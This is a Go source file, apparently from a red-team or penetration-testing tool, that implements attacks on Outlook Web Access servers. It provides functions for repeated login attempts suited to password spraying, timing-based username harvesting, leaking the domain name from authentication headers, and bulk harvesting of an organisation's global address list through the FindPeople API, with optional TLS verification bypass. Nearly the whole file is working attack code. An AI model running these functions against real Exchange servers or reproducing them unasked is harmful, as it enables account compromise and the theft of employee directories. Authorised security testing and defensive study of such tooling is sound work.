// Package owa implements helpers for interacting with Outlook Web Access (OWA).
package owa

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"strings"
	"time"

	"golang.org/x/net/publicsuffix"
)

// Client wraps an HTTP client configured for OWA interaction.
type Client struct {
	BaseURL    string
	HTTPClient *http.Client
}

// NewClient creates a new OWA client.
func NewClient(hostname string, skipTLS bool) (*Client, error) {
	jar, err := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List})
	if err != nil {
		return nil, err
	}
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: skipTLS}, //nolint:gosec
	}
	httpClient := &http.Client{
		Timeout:   20 * time.Second,
		Transport: tr,
		Jar:       jar,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse // don't follow – we need the redirect location
		},
	}

	hostname = strings.TrimPrefix(hostname, "https://")
	hostname = strings.TrimPrefix(hostname, "http://")
	hostname = strings.TrimSuffix(hostname, "/")

	return &Client{
		BaseURL:    "https://" + hostname,
		HTTPClient: httpClient,
	}, nil
}

// TryLogin attempts to authenticate against OWA and returns true on success.
func (c *Client) TryLogin(username, password string) (bool, error) {
	loginURL := c.BaseURL + "/owa/auth.owa"
	data := url.Values{
		"destination": {c.BaseURL + "/owa/"},
		"flags":       {"4"},
		"username":    {username},
		"password":    {password},
	}

	req, err := http.NewRequest("POST", loginURL, strings.NewReader(data.Encode()))
	if err != nil {
		return false, err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0")

	resp, err := c.HTTPClient.Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)

	// A successful OWA login returns a redirect to /owa/ (302) or 200 directly
	if resp.StatusCode == 302 {
		loc := resp.Header.Get("Location")
		if loc != "" && !strings.Contains(strings.ToLower(loc), "logon") {
			return true, nil
		}
	}
	// Some Exchange versions respond with 200 on success
	if resp.StatusCode == 200 {
		return true, nil
	}
	return false, nil
}

// GetWWWAuthenticate returns the WWW-Authenticate header value from an OWA GET.
// This can expose the domain name.
func (c *Client) GetWWWAuthenticate() (string, error) {
	req, err := http.NewRequest("GET", c.BaseURL+"/owa/", nil)
	if err != nil {
		return "", err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0")

	resp, err := c.HTTPClient.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)

	return resp.Header.Get("WWW-Authenticate"), nil
}

// TimedLogin measures login request latency for timing-based username harvesting.
func (c *Client) TimedLogin(username, password string) (bool, time.Duration, error) {
	loginURL := c.BaseURL + "/owa/auth.owa"
	data := url.Values{
		"destination": {c.BaseURL + "/owa/"},
		"flags":       {"4"},
		"username":    {username},
		"password":    {password},
	}

	req, err := http.NewRequest("POST", loginURL, strings.NewReader(data.Encode()))
	if err != nil {
		return false, 0, err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0")

	start := time.Now()
	resp, err := c.HTTPClient.Do(req)
	elapsed := time.Since(start)
	if err != nil {
		return false, elapsed, err
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)

	success := false
	if resp.StatusCode == 302 {
		loc := resp.Header.Get("Location")
		if loc != "" && !strings.Contains(strings.ToLower(loc), "logon") {
			success = true
		}
	}
	return success, elapsed, nil
}

// GetGALFindPeople uses the OWA FindPeople API (Exchange 2013+) to harvest the GAL.
func (c *Client) GetGALFindPeople(username, password string, maxResults int) ([]GALEntry, error) {
	// First authenticate.
	if ok, err := c.TryLogin(username, password); err != nil || !ok {
		if err != nil {
			return nil, fmt.Errorf("OWA login failed: %w", err)
		}
		return nil, fmt.Errorf("OWA login failed: invalid credentials")
	}

	var all []GALEntry
	offset := 0
	pageSize := 100

	for {
		apiURL := fmt.Sprintf("%s/owa/service.svc?action=FindPeople", c.BaseURL)
		payload := fmt.Sprintf(`{"__type":"FindPeopleJsonRequest:#Exchange",
"Header":{"__type":"JsonRequestHeaders:#Exchange","RequestServerVersion":"Exchange2013","TimeZoneContext":{"__type":"TimeZoneContext:#Exchange","TimeZoneDefinition":{"__type":"TimeZoneDefinitionType:#Exchange","Id":"UTC"}}},
"Body":{"__type":"FindPeopleRequest:#Exchange","IndexedPageItemView":{"__type":"IndexedPageView:#Exchange","BasePoint":"Beginning","Offset":%d,"MaxEntriesReturned":%d},
"QueryString":"","SearchPeopleSuggestionIndex":false,"ParentFolderId":{"__type":"TargetFolderId:#Exchange","BaseFolderId":{"__type":"DistinguishedFolderId:#Exchange","Id":"directory"}},
"PersonaShape":{"__type":"PersonaResponseShape:#Exchange","BaseShape":"Default"}}}`,
			offset, pageSize)

		req, err := http.NewRequest("POST", apiURL, strings.NewReader(payload))
		if err != nil {
			return all, err
		}
		req.Header.Set("Content-Type", "application/json; charset=utf-8")
		req.Header.Set("User-Agent", "Mozilla/5.0")
		req.Header.Set("X-OWA-CANARY", c.getCanary())

		resp, err := c.HTTPClient.Do(req)
		if err != nil {
			return all, err
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		entries := parseGALFindPeopleJSON(string(body))
		all = append(all, entries...)
		offset += len(entries)

		if len(entries) < pageSize || (maxResults > 0 && len(all) >= maxResults) {
			break
		}
	}
	return all, nil
}

// GALEntry is a single address book entry.
type GALEntry struct {
	DisplayName  string
	EmailAddress string
}

func (c *Client) getCanary() string {
	// In a full implementation we'd scrape the canary token from the OWA page.
	// For now return empty; most internal deployments don't enforce this for basic API calls.
	return ""
}

// parseGALFindPeopleJSON is a minimal JSON parser for FindPeople responses.
func parseGALFindPeopleJSON(body string) []GALEntry {
	var entries []GALEntry
	// Quick scan without importing encoding/json to keep deps light.
	// Each persona has "DisplayName":"..." and "EmailAddress":"..."
	parts := strings.Split(body, `"DisplayName":`)
	for _, part := range parts[1:] {
		dn := extractJSONString(part)
		emailPart := ""
		if idx := strings.Index(part, `"EmailAddress":`); idx != -1 {
			emailPart = extractJSONString(part[idx+len(`"EmailAddress":`):])
		}
		if emailPart != "" {
			entries = append(entries, GALEntry{DisplayName: dn, EmailAddress: emailPart})
		}
	}
	return entries
}

func extractJSONString(s string) string {
	s = strings.TrimSpace(s)
	if !strings.HasPrefix(s, `"`) {
		return ""
	}
	s = s[1:]
	end := strings.Index(s, `"`)
	if end == -1 {
		return ""
	}
	return s[:end]
}
